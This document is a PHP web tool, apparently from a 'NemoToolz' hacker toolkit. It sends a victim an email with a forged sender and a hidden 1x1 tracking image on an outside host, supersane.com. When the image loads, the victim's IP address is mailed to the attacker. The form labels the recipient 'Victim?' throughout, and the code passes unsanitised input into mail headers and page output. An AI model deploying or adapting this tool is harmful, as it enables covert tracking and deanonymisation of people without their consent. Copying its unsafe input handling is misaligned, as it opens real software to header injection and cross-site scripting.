<?php
if ($s == "3" && $email && $victim){
$subject = "$victim:$REMOTE_ADDR";
$msg = "The ip address you requested.\n$victim\n$REMOTE_ADDR\n-http://www.nemohackers.com";
$header = "From: NemoToolz <toolz@nemohackers.com>";
mail($email,$subject,$msg,$header);
sleep(2);
header("404");
} elseif ($s == "2"){

include("toolheader.php");

$header = "Content-type: text/html\nFrom: $header1";
$vicmessage .= "\n<img src=http://supersane.com/tools/emailip.php?email=$email&victim=$victim&s=3 height=1 width=1>";
mail($victim,$vicsubject,$vicmessage,$header);
?>
<center>
<p>
      <font face="Courier New, Courier, mono"><br>
      As soon as <?php echo $victim;?> checks their email you<br>
      will recieve an email with their current ip address.<br>
      Of course if they are using a proxy this will simply<br>
      return the proxy ip address.</font></p>
    <font face="Courier New, Courier, mono">Message they will recieve:</font><br>
    <table width="400" border="0" cellspacing="2" cellpadding="2">
      <tr> 
        <td width="106" valign="top"> 
          <div align="right"><font face="Courier New, Courier, mono">From:</font></div>
        </td>
        <td width="280"><font face="Courier New, Courier, mono"><?php echo $header1;?></font></td>
      </tr>
      <tr> 
        <td width="106" valign="top"> 
          <div align="right"><font face="Courier New, Courier, mono">Subject:</font></div>
        </td>
        <td width="280"><font face="Courier New, Courier, mono"><?php echo $vicsubject;?></font></td>
      </tr>
      <tr> 
        <td width="106" valign="top"> 
          <div align="right"><font face="Courier New, Courier, mono">Message:</font></div>
        </td>
        <td width="280"><font face="Courier New, Courier, mono"><?php echo $vicmessage;?></font></td>
      </tr>
    </table>
    <p><a href="emailip.php?s=1"><font face="Courier New, Courier, mono">Do it 
      to someone else?</font></a></p>
</center>

<?php
include("toolfooter.php");
} elseif (!$s || $s=="1"){
include("toolheader.php");
?>
<form action=emailip.php method=post>
<div align="center"><br>
    <table width="552" border="0" cellspacing="2" cellpadding="2">
      <tr> 
        <td width="196" valign="top"> 
          <div align="right"><font face="Courier New, Courier, mono">
            <input type="hidden" name="s" value="2">
            Victim?</font></div>
        </td>
        <td width="342"> 
          <input type="text" name="victim" value="who@where.com">
        </td>
      </tr>
      <tr> 
        <td width="196" valign="top"> 
          <div align="right"><font face="Courier New, Courier, mono">Where to 
            send ip?</font></div>
        </td>
        <td width="342"> 
          <input type="text" name="email" value="you@address.com">
        </td>
      </tr>
      <tr> 
        <td width="196" valign="top"> 
          <div align="right"><font face="Courier New, Courier, mono">Their Subject?</font></div>
        </td>
        <td width="342"> 
          <input type="text" name="vicsubject" value="hey man...">
        </td>
      </tr>
      <tr> 
        <td width="196" valign="top"> 
          <div align="right"><font face="Courier New, Courier, mono">Their Message</font></div>
        </td>
        <td width="342"> 
          <textarea name="vicmessage" wrap="physical" rows=7 cols=35>how you doin? long time no see.</textarea>
        </td>
      </tr>
      <tr>
        <td width="196" valign="top">
          <div align="right"><font face="Courier New, Courier, mono">From Who?</font></div>
        </td>
        <td width="342">
          <input type="text" name="header1" value="whoever@whereever.com">
        </td>
      </tr>
      <tr> 
        <td width="196" valign="top"> 
          <div align="right"><font face="Courier New, Courier, mono">Do It?</font></div>
        </td>
        <td width="342"> 
          <input type="submit" name="Submit" value="Yes">
        </td>
      </tr>
    </table>
</div>
</form>

<?php
require("toolfooter.php");
} else {
require("toolheader.php");
?>
<center>
<?php
echo "Send to or victim not specified.";
echo "</center>";
require("toolfooter.php");
}
?>
